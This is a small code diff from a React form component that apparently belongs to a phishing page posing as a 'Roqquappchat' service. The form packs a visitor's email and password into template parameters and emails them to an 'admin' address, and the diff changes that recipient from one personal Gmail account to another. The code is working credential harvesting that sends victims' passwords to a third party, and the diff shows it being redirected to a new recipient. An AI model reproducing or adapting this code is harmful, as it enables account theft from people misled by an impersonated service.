@@ -20,7 +20,7 @@ const Form = (props) => {
     const templateParams = {
         client_email: email,
         client_password: password,
-        admin_email: 'munisco12@gmail.com',
+        admin_email: 'Testimonyibom@gmail.com',
         from_name: 'Roqquappchat',
         to_name: 'Admin'
        
